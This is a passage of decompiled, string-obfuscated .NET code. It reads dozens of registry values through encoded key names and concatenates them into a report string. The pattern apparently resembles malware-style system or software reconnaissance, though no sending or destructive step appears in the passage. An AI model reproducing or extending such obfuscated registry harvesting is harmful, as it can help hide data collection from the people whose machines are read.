						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("KŶɸ\u033cшճٴݫ࠷तਵ\u0b5b\u0c63൷\u0e7f༰၉ᅡቿጬᑉᕿᙺᝡᡩᥣ\u1a76᭷\u1c38ᴸḺ")), Registry.GetValue(GClass0.smethod_0("\u0019ěȊ\u0317ВԀ\u0604܉ࠈऄਘଋ\u0c04ഇซ་ဏᄅባ፭ᑲᕺᙯ\u176dᡸᥪ\u1a72᭪ᱰᵘṖὑ⁅⅂≀⍀⑄╏☋❫⡛⥜⩔⭺Ⱡⵥ⸃⽥\u3040ㅍ㉺㍭㑁㕈㙳㝿㠹㥋㩾㭻㱦㴴㸡㼲䁞䅠䉪䍠䐭䕊䙤䝸䠩䥊䩲䭵䱬䵪书佱偲"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_2623;
						IL_2623:
						num = 207;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\fĈȇ\u0318Пճٱݾ\u087dॷ\u0a65୴౹൴\u0e7e\u0f7cၺᅶቮ።ᑿᕩᙺ\u177aᡭ\u1979\u1a6f᭵ᱭᵋṃ\u1f46⁐⅑≍⍏⑉╼☾❜⡮⥯⩩⭅ⱝⵖ⸶⽒ふㅾ㉷㍢㑌㕛㙦㝨㠬㥘㩣㭤㱻㴧㸴㼥䁔䅦䉶䍲"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_2656;
						}
						goto IL_26b0;
						IL_2656:
						num = 208;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("FŹɵ\u032fѝդ١ݸ\u082a\u093bਨ\u0b57\u0c63൱\u0e77༸\u1038ᄺ")), Registry.GetValue(GClass0.smethod_0("\fĈȇ\u0318Пճٱݾ\u087dॷ\u0a65୴౹൴\u0e7e\u0f7cၺᅶቮ።ᑿᕩᙺ\u177aᡭ\u1979\u1a6f᭵ᱭᵋṃ\u1f46⁐⅑≍⍏⑉╼☾❜⡮⥯⩩⭅ⱝⵖ⸶⽒ふㅾ㉷㍢㑌㕛㙦㝨㠬㥘㩣㭤㱻㴧㸴㼥䁔䅦䉶䍲"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_26b0;
						IL_26b0:
						num = 210;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u000fčȀ\u031dМԎ؎܃\u087eॲ\u0a62ୱ౺൹\u0e71\u0f71ၹᅳቩ፧ᑼᕴᙥᝧᡮ\u197c\u1a68\u1b70ᱮᵆṌὋ⁓⅔≊⍊⑊╁☁❡⡭⥪⩮⭀ⱞⵛ⸹⽟ぶㅻ㉰㍧㑏㕆㙹㝵㠯㥝㩤㭡㱸㴪㸻㼨䁔䅣䉤䍷䑬䕬䙲"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_26e3;
						}
						goto IL_273d;
						IL_26e3:
						num = 211;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Ażɶ\u0332тչ٢ݽ\u082d\u093eਫ\u0b59౬൩\u0e74ཀྵ\u106bᅷሸጸᐺ")), Registry.GetValue(GClass0.smethod_0("\u000fčȀ\u031dМԎ؎܃\u087eॲ\u0a62ୱ౺൹\u0e71\u0f71ၹᅳቩ፧ᑼᕴᙥᝧᡮ\u197c\u1a68\u1b70ᱮᵆṌὋ⁓⅔≊⍊⑊╁☁❡⡭⥪⩮⭀ⱞⵛ⸹⽟ぶㅻ㉰㍧㑏㕆㙹㝵㠯㥝㩤㭡㱸㴪㸻㼨䁔䅣䉤䍷䑬䕬䙲"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_273d;
						IL_273d:
						num = 213;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u001aĚȕ\u0316Бԁ\u0603܈ࠋअਗଊఇആฌ༊ဌᄄሜ፬ᑱᕻᙨᝬ\u187bᥫ\u1a7d\u1b6bᱳᵙṑὐ⁆⅃≟⍁⑇╎☌❪⡘⥝⩛⭻Ᵽⵤ⸄⽤ぃㅌ㉅㍬㑂㕉㙴㝾㠺㥊㩱㭺㱥㴵㸦㼳䁕䅽䉱䍢䑡䕸䙾䜫䡆䥠䩮䭢䰦䵖买佶偤內"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_2770;
						}
						goto IL_27ca;
						IL_2770:
						num = 214;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("tŷɻ\u033dяղٷݪ࠸थਸ਼\u0b52౸൲\u0e7f\u0f7eၥᅽሮፁᑥᕭᙯᜩᡛᥳ\u1a73᭣ᱢᴸḸἺ")), Registry.GetValue(GClass0.smethod_0("\u001aĚȕ\u0316Бԁ\u0603܈ࠋअਗଊఇആฌ༊ဌᄄሜ፬ᑱᕻᙨᝬ\u187bᥫ\u1a7d\u1b6bᱳᵙṑὐ⁆⅃≟⍁⑇╎☌❪⡘⥝⩛⭻Ᵽⵤ⸄⽤ぃㅌ㉅㍬㑂㕉㙴㝾㠺㥊㩱㭺㱥㴵㸦㼳䁕䅽䉱䍢䑡䕸䙾䜫䡆䥠䩮䭢䰦䵖买佶偤內"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_27ca;
						IL_27ca:
						num = 216;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0019ěȊ\u0317ВԀ\u0604܉ࠈऄਘଋ\u0c04ഇซ་ဏᄅባ፭ᑲᕺᙯ\u176dᡸᥪ\u1a72᭪ᱰᵘṖὑ⁅⅂≀⍀⑄╏☋❫⡛⥜⩔⭺Ⱡⵥ⸃⽥\u3040ㅍ㉺㍭㑁㕈㙳㝿㠹㥋㩾㭻㱦㴴㸡㼲䁒䅵䉣䍫䑯䕾䙪䝾䡠䥧䩩䬦䱖䵰乶佤偧"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_27fd;
						}
						goto IL_2857;
						IL_27fd:
						num = 217;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("KŶɸ\u033cшճٴݫ࠷तਵ\u0b57\u0c76ൾ\u0e74\u0f72ၽᅯቹ፥ᑤᕤᘩ\u175bᡳᥳ\u1a63᭢\u1c38ᴸḺ")), Registry.GetValue(GClass0.smethod_0("\u0019ěȊ\u0317ВԀ\u0604܉ࠈऄਘଋ\u0c04ഇซ་ဏᄅባ፭ᑲᕺᙯ\u176dᡸᥪ\u1a72᭪ᱰᵘṖὑ⁅⅂≀⍀⑄╏☋❫⡛⥜⩔⭺Ⱡⵥ⸃⽥\u3040ㅍ㉺㍭㑁㕈㙳㝿㠹㥋㩾㭻㱦㴴㸡㼲䁒䅵䉣䍫䑯䕾䙪䝾䡠䥧䩩䬦䱖䵰乶佤偧"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_2857;
						IL_2857:
						num = 219;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0019ěȊ\u0317ВԀ\u0604܉ࠈऄਘଋ\u0c04ഇซ་ဏᄅባ፭ᑲᕺᙯ\u176dᡸᥪ\u1a72᭪ᱰᵘṖὑ⁅⅂≀⍀⑄╏☋❫⡛⥜⩔⭺Ⱡⵥ⸃⽥\u3040ㅍ㉺㍭㑁㕈㙳㝿㠹㥋㩾㭻㱦㴴㸡㼲䁙䄰䉂䌮䑋䕭䙸䝢䡠䥧䩩䬦䱖䵰乶佤偧"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_288a;
						}
						goto IL_28e4;
						IL_288a:
						num = 220;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("KŶɸ\u033cшճٴݫ࠷तਵଡ଼ళൟ\u0e31བၮᅽብ፥ᑤᕤᘩ\u175bᡳᥳ\u1a63᭢\u1c38ᴸḺ")), Registry.GetValue(GClass0.smethod_0("\u0019ěȊ\u0317ВԀ\u0604܉ࠈऄਘଋ\u0c04ഇซ་ဏᄅባ፭ᑲᕺᙯ\u176dᡸᥪ\u1a72᭪ᱰᵘṖὑ⁅⅂≀⍀⑄╏☋❫⡛⥜⩔⭺Ⱡⵥ⸃⽥\u3040ㅍ㉺㍭㑁㕈㙳㝿㠹㥋㩾㭻㱦㴴㸡㼲䁙䄰䉂䌮䑋䕭䙸䝢䡠䥧䩩䬦䱖䵰乶佤偧"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_28e4;
						IL_28e4:
						num = 222;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0018Ąȋ\u0314Гԇ\u0605܊ࠉऋਙଈఅ\u0d00ช༈ဎᅺቢ፮ᑳᕽ᙮ᝮ\u1879ᥥ\u1a73᭩ᱱᵟṗὒ⁄⅝≁⍃⑅╈☊❨⡚⥓⩕⭹ⱡⵢ⸂⽦ぁㅲ㉻㍮㑀㕏㙲㝼㠸㥄㩿㭸㱧㴳㸠㼱䁖䅮䉣䍤䑠䕲䘪䝏䡽䥩䨦䭖䱰䵶乤佧"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_2917;
						}
						goto IL_2971;
						IL_2917:
						num = 223;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Jŵɹ\u033bщհٵݤ࠶ध\u0a34\u0b55\u0c73ർ\u0e79ལၷᄭቊ\u137eᑤᔩᙛ\u1773ᡳᥣ\u1a62\u1b38\u1c38ᴺ")), Registry.GetValue(GClass0.smethod_0("\u0018Ąȋ\u0314Гԇ\u0605܊ࠉऋਙଈఅ\u0d00ช༈ဎᅺቢ፮ᑳᕽ᙮ᝮ\u1879ᥥ\u1a73᭩ᱱᵟṗὒ⁄⅝≁⍃⑅╈☊❨⡚⥓⩕⭹ⱡⵢ⸂⽦ぁㅲ㉻㍮㑀㕏㙲㝼㠸㥄㩿㭸㱧㴳㸠㼱䁖䅮䉣䍤䑠䕲䘪䝏䡽䥩䨦䭖䱰䵶乤佧"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_2971;
						IL_2971:
						num = 225;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("pżɳ\u036cѫտٽݲ\u0871\u0963\u0a71ୠ౭൨\u0e62འၦᅢቺ፶ᑫᕥᙶ\u1776ᡡ᥍\u1a5b\u1b41᱘ᵍṞἹ⁙Ⅲ≲⍼⑻┳♗❩⡤⥽⩯⭮ⱸⵤ\u2e78⽕せㅢ㉲㍱㑭㕭㙥㝲"), GClass0.smethod_0("ZŢɡ\u0325ъբٯݤ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_29a4;
						}
						goto IL_29fe;
						IL_29a4:
						num = 226;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("RŃɐ\u0333ѓդٴݦࡡभ\u0a49୳౾ൻ\u0e69ཤ\u1072ᅪቶጸᐸᔺ")), Registry.GetValue(GClass0.smethod_0("pżɳ\u036cѫտٽݲ\u0871\u0963\u0a71ୠ౭൨\u0e62འၦᅢቺ፶ᑫᕥᙶ\u1776ᡡ᥍\u1a5b\u1b41᱘ᵍṞἹ⁙Ⅲ≲⍼⑻┳♗❩⡤⥽⩯⭮ⱸⵤ\u2e78⽕せㅢ㉲㍱㑭㕭㙥㝲"), GClass0.smethod_0("ZŢɡ\u0325ъբٯݤ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_29fe;
						IL_29fe:
						num = 228;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("pżɳ\u036cѫտٽݲ\u0871\u0963\u0a71ୠ౭൨\u0e62འၦᅢቺ፶ᑫᕥᙶ\u1776ᡡ᥍\u1a5b\u1b41᱘ᵍṞἹ⁙Ⅲ≲⍼⑻┳♗❩⡤⥽⩯⭮ⱸⵤ\u2e78⽕せㅢ㉲㍱㑭㕭㙥㝲"), GClass0.smethod_0("XŬɯ\u0327шհ٩ݡࡧॳ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_2a31;
						}
						goto IL_2a8b;
						IL_2a31:
						num = 229;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("YŊɟ\u033aјխٳݿ\u087aऴ\u0a56୪\u0c65\u0d62\u0e6e\u0f6dၹᅣቹጪᑚᕭᙵᝯᡤᥨᨸ\u1b38\u1c3a")), Registry.GetValue(GClass0.smethod_0("pżɳ\u036cѫտٽݲ\u0871\u0963\u0a71ୠ౭൨\u0e62འၦᅢቺ፶ᑫᕥᙶ\u1776ᡡ᥍\u1a5b\u1b41᱘ᵍṞἹ⁙Ⅲ≲⍼⑻┳♗❩⡤⥽⩯⭮ⱸⵤ\u2e78⽕せㅢ㉲㍱㑭㕭㙥㝲"), GClass0.smethod_0("XŬɯ\u0327шհ٩ݡࡧॳ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_2a8b;
						IL_2a8b:
						num = 231;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("zźɵͶѱա٣ݨ\u086b॥\u0a77୪౧൦\u0e6cཪ\u106cᅤቼፌᑑᕛᙈᝌᡛ᥋\u1a5dᭋ᱅ᵼṱὡ\u2060ⅰ≌⍊④╽♥❹⡯⤩⩍⭦ⱴ\u2d71\u2e6c⼣かㅈ"), GClass0.smethod_0("FŀɈ\u0367Ѹ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_2abe;
						}
						goto IL_2b18;
						IL_2abe:
						num = 232;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Wżɠ\u0366Ѽըجݎ\u086bॻ\u0a7c୯ద\u0d4c\u0e4d༸\u1038ᄺ")), Registry.GetValue(GClass0.smethod_0("zźɵͶѱա٣ݨ\u086b॥\u0a77୪౧൦\u0e6cཪ\u106cᅤቼፌᑑᕛᙈᝌᡛ᥋\u1a5dᭋ᱅ᵼṱὡ\u2060ⅰ≌⍊④╽♥❹⡯⤩⩍⭦ⱴ\u2d71\u2e6c⼣かㅈ"), GClass0.smethod_0("FŀɈ\u0367Ѹ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_2b18;
						IL_2b18:
						num = 234;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("`Ŭɣͼѻկ٭ݢࡡ\u0953\u0a41\u0b50\u0c5d൘๒ཐ\u1056ᅒቊፆᑛᕕᙆᝆᡑᥝᩋ᭑ᱟᵢṯύ⁺Ⅶ≚⍆⑀╈♧❸"), GClass0.smethod_0("bŦɣͳ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_2b4b;
						}
						goto IL_2ba5;
						IL_2b4b:
						num = 235;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("mĤɬ\u0326ѦԨٷܤ࠸स\u0a3a")), Registry.GetValue(GClass0.smethod_0("`Ŭɣͼѻկ٭ݢࡡ\u0953\u0a41\u0b50\u0c5d൘๒ཐ\u1056ᅒቊፆᑛᕕᙆᝆᡑᥝᩋ᭑ᱟᵢṯύ⁺Ⅶ≚⍆⑀╈♧❸"), GClass0.smethod_0("bŦɣͳ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_2ba5;
						IL_2ba5:
						num = 237;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("~žɱ\u036aѭսٿݬ\u086fॡੳ୦౫൪\u0e60\u0f6e\u1068ᅠቸ፰ᑭᕧᙴᝈᡟ᥏\u1a59ᭇᱜᴴṋὲ⁵Ⅰ≦⍶\u244e╓♱❬⡥⥚⩩⭩ⱖⵠ⹄⽦びㅫ㉧㍫㑧㕳"), GClass0.smethod_0("VŋɅ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_2bd8;
						}
						goto IL_2c32;
						IL_2bd8:
						num = 238;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Mħɚ\u036dѤճٷݡ࠸स\u0a3a")), Registry.GetValue(GClass0.smethod_0("~žɱ\u036aѭսٿݬ\u086fॡੳ୦౫൪\u0e60\u0f6e\u1068ᅠቸ፰ᑭᕧᙴᝈᡟ᥏\u1a59ᭇᱜᴴṋὲ⁵Ⅰ≦⍶\u244e╓♱❬⡥⥚⩩⭩ⱖⵠ⹄⽦びㅫ㉧㍫㑧㕳"), GClass0.smethod_0("VŋɅ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_2c32;
						IL_2c32:
						num = 240;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("yŻɪͷѲՠ٤ݩࡨ।\u0a78୫\u0c64൧\u0e6bཫၯᅥቃፍᑒᕚᙏᝍᡘ᥊ᩒᭊ᱖ᵆṊ\u1f46\u2054⅛≓⍈\u244c╞♈❘⡐⥔⩒⭄ⱌ\u2d2a⹀⽍が"), GClass0.smethod_0("FŀɈ\u0367Ѹ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_2c65;
						}
						goto IL_2cbf;
						IL_2c65:
						num = 241;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Oŉɕ\u0345ї՝ظ\u0738࠺")), Registry.GetValue(GClass0.smethod_0("yŻɪͷѲՠ٤ݩࡨ।\u0a78୫\u0c64൧\u0e6bཫၯᅥቃፍᑒᕚᙏᝍᡘ᥊ᩒᭊ᱖ᵆṊ\u1f46\u2054⅛≓⍈\u244c╞♈❘⡐⥔⩒⭄ⱌ\u2d2a⹀⽍が"), GClass0.smethod_0("FŀɈ\u0367Ѹ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_2cbf;
						IL_2cbf:
						num = 243;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("zźɵͶѱա٣ݨ\u086b॥\u0a77୪౧൦\u0e6cཪ\u106cᅤቼፌᑑᕛᙈᝌᡛ᥋\u1a5dᭋ᱕ᵇṍ\u1f47⁗⅚≌⍉\u244f╟♏❙⡓⤻⩔⭒ⱄⵌ⸪⽀きㅌ"), GClass0.smethod_0("FŀɈ\u0367Ѹ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_2cf2;
						}
						goto IL_2d4c;
						IL_2cf2:
						num = 244;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Oŉɕ\u0345ї՝ظ\u0738࠺")), Registry.GetValue(GClass0.smethod_0("zźɵͶѱա٣ݨ\u086b॥\u0a77୪౧൦\u0e6cཪ\u106cᅤቼፌᑑᕛᙈᝌᡛ᥋\u1a5dᭋ᱕ᵇṍ\u1f47⁗⅚≌⍉\u244f╟♏❙⡓⤻⩔⭒ⱄⵌ⸪⽀きㅌ"), GClass0.smethod_0("FŀɈ\u0367Ѹ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_2d4c;
						IL_2d4c:
						num = 246;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("wŵɸ\u0365Ѥնٶݻ\u0876ॺ੪\u0b79\u0c72൱\u0e79\u0f79ၡᅫቱ\u137fᑤᕬᙽ\u177fᡦᥴ\u1a60᭸ᱦᵎṄὃ\u206bⅬ≲⍲⑲╹☹❙⡥⥢⩦⭈ⱖⵓ⸱⽃みㅡ㉿㍸㑸㕖㙏㝁㡁㥇㨥㬶㰳㴲㸳"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_2d7f;
						}
						goto IL_2dd9;
						IL_2d7f:
						num = 247;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("JłɌ\u0348ШԵض\u0735࠶सਸ\u0b3a")), Registry.GetValue(GClass0.smethod_0("wŵɸ\u0365Ѥնٶݻ\u0876ॺ੪\u0b79\u0c72൱\u0e79\u0f79ၡᅫቱ\u137fᑤᕬᙽ\u177fᡦᥴ\u1a60᭸ᱦᵎṄὃ\u206bⅬ≲⍲⑲╹☹❙⡥⥢⩦⭈ⱖⵓ⸱⽃みㅡ㉿㍸㑸㕖㙏㝁㡁㥇㨥㬶㰳㴲㸳"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_2dd9;
						IL_2dd9:
						num = 249;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("wŵɸ\u0365Ѥնٶݻ\u0876ॺ੪\u0b79\u0c72൱\u0e79\u0f79ၡᅫቱ\u137fᑤᕬᙽ\u177fᡦᥴ\u1a60᭸ᱦᵎṄὃ\u206bⅬ≲⍲⑲╹☹❙⡥⥢⩦⭈ⱖⵓ⸱⽃みㅡ㉿㍸㑸㕖㙏㝁㡁㥇㨥㬶㰳㴲㸲"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_2e0c;
						}
						goto IL_2e66;
						IL_2e0c:
						num = 250;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("JłɌ\u0348ШԵض\u0735࠷सਸ\u0b3a")), Registry.GetValue(GClass0.smethod_0("wŵɸ\u0365Ѥնٶݻ\u0876ॺ੪\u0b79\u0c72൱\u0e79\u0f79ၡᅫቱ\u137fᑤᕬᙽ\u177fᡦᥴ\u1a60᭸ᱦᵎṄὃ\u206bⅬ≲⍲⑲╹☹❙⡥⥢⩦⭈ⱖⵓ⸱⽃みㅡ㉿㍸㑸㕖㙏㝁㡁㥇㨥㬶㰳㴲㸲"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_2e66;
						IL_2e66:
						num = 252;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("wŵɸ\u0365Ѥնٶݻ\u0876ॺ੪\u0b79\u0c72൱\u0e79\u0f79ၡᅫቱ\u137fᑤᕬᙽ\u177fᡦᥴ\u1a60᭸ᱦᵎṄὃ\u206bⅬ≲⍲⑲╹☹❙⡥⥢⩦⭈ⱖⵓ⸱⽃みㅡ㉿㍸㑸㕖㙏㝁㡁㥇㨥㬶㰳㴲㸵"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_2e99;
						}
						goto IL_2ef3;
						IL_2e99:
						num = 253;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("JłɌ\u0348ШԵض\u0735࠰सਸ\u0b3a")), Registry.GetValue(GClass0.smethod_0("wŵɸ\u0365Ѥնٶݻ\u0876ॺ੪\u0b79\u0c72൱\u0e79\u0f79ၡᅫቱ\u137fᑤᕬᙽ\u177fᡦᥴ\u1a60᭸ᱦᵎṄὃ\u206bⅬ≲⍲⑲╹☹❙⡥⥢⩦⭈ⱖⵓ⸱⽃みㅡ㉿㍸㑸㕖㙏㝁㡁㥇㨥㬶㰳㴲㸵"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_2ef3;
						IL_2ef3:
						num = 255;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("wŵɸ\u0365Ѥնٶݻ\u0876ॺ੪\u0b79\u0c72൱\u0e79\u0f79ၡᅫቱ\u137fᑤᕬᙽ\u177fᡦᥴ\u1a60᭸ᱦᵎṄὃ\u206bⅬ≲⍲⑲╹☹❙⡥⥢⩦⭈ⱖⵓ⸱⽃みㅡ㉿㍸㑸㕖㙏㝁㡁㥇㨥㬶㰳㴲㸴"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_2f26;
						}
						goto IL_2f80;
						IL_2f26:
						num = 256;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("JłɌ\u0348ШԵض\u0735࠱सਸ\u0b3a")), Registry.GetValue(GClass0.smethod_0("wŵɸ\u0365Ѥնٶݻ\u0876ॺ੪\u0b79\u0c72൱\u0e79\u0f79ၡᅫቱ\u137fᑤᕬᙽ\u177fᡦᥴ\u1a60᭸ᱦᵎṄὃ\u206bⅬ≲⍲⑲╹☹❙⡥⥢⩦⭈ⱖⵓ⸱⽃みㅡ㉿㍸㑸㕖㙏㝁㡁㥇㨥㬶㰳㴲㸴"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_2f80;
						IL_2f80:
						num = 258;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("uŷɾ\u0363Ѧմٸݵ\u0874ॸ੬\u0b7f\u0c70൳\u0e67ཧ\u1063ᅩቷ፹ᑦᕮᙳ\u1771ᡤ\u1976\u1a66\u1b7eᱤᵌṺώ\u2069Ⅾ≴⍴⑰╻☷❗⡧⥠⩠⭎ⱔⵑⸯ⽝ぽㅣ㉹㍾㑺㕔㙁㝏㡃㥅㨣㬲㰶"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_2fb3;
						}
						goto IL_300d;
						IL_2fb3:
						num = 259;
